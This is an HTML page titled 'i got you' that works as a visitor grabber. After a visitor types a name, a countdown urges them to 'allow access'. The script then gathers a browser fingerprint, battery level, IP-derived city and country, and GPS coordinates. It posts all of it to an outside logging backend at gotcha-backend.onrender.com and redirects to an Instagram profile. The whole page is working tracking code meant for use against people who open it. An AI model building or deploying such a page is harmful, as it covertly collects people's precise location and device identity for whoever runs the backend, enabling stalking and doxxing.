<!DOCTYPE html>
<html>
<head>
  <title>i got you</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: black;
      color: white;
      font-family: monospace;
      font-size: 1em;
      padding: 2em;
      text-align: center;
    }
    h1 {
      font-size: 3em;
      margin-bottom: 1em;
    }
    input {
      padding: 10px;
      font-size: 1em;
      margin-bottom: 1em;
      border: none;
      border-radius: 5px;
    }
    #countdown {
      font-size: 1.5em;
      color: red;
      margin-top: 1em;
    }
  </style>
</head>
<body>
  <h1>i got you</h1>
  <p>Type your name:</p>
  <input type="text" id="username" placeholder="Your name here" />
  <div id="countdown" style="display:none;">You have 5 seconds to allow access...</div>
  <p id="battery"></p>

  <script>
    const countdownEl = document.getElementById("countdown");
    const batteryEl = document.getElementById("battery");
    const nameInput = document.getElementById("username");

    let userData = {
      name: "",
      battery: null,
      lat: null,
      lon: null,
      fingerprint: null
    };

    // Basic fingerprint from system info
    function createFingerprint() {
      const str = navigator.userAgent + navigator.language + screen.width + screen.height + navigator.platform;
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        hash = (hash << 5) - hash + str.charCodeAt(i);
        hash |= 0;
      }
      return hash.toString();
    }

    userData.fingerprint = createFingerprint();

    // Battery
    navigator.getBattery?.().then(battery => {
      const percent = Math.round(battery.level * 100);
      batteryEl.textContent = `Battery: ${percent}%`;
      userData.battery = percent;
    });

    nameInput.addEventListener("change", () => {
      const name = nameInput.value.trim();
      if (!name) return;

      userData.name = name;
      countdownEl.style.display = "block";
      let seconds = 5;
      const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = `You have ${seconds} second${seconds !== 1 ? "s" : ""} to allow access...`;
        if (seconds <= 0) {
          clearInterval(interval);
          countdownEl.textContent = "Requesting location...";
          logVisitor();
        }
      }, 1000);
    });

    async function logVisitor() {
      const ua = navigator.userAgent;
      const isMobile = /Mobi|Android/i.test(ua);
      const os = navigator.platform || "Unknown";
      const browser = navigator.userAgentData?.brands?.[1]?.brand || "Unknown";

      let ipData = {};
      try {
        const res = await fetch("https://api.db-ip.com/v2/free/self");
        ipData = await res.json();
      } catch {}

      const postToBackend = () => {
        fetch("https://gotcha-backend.onrender.com/log", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ...userData,
            ip: ipData.ipAddress,
            city: ipData.city,
            region: ipData.stateProv,
            country: ipData.countryName,
            device: isMobile ? "Mobile" : "Desktop",
            os: os,
            browser: browser
          })
        }).finally(() => {
          // Always redirect
          window.location.href = "https://instagram.com/ziahiscrazyasf";
        });
      };

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            userData.lat = pos.coords.latitude.toFixed(5);
            userData.lon = pos.coords.longitude.toFixed(5);
            postToBackend();
          },
          err => {
            postToBackend(); // Log without GPS
          }
        );
      } else {
        postToBackend(); // Log without GPS
      }
    }
  </script>
</body>
</html>
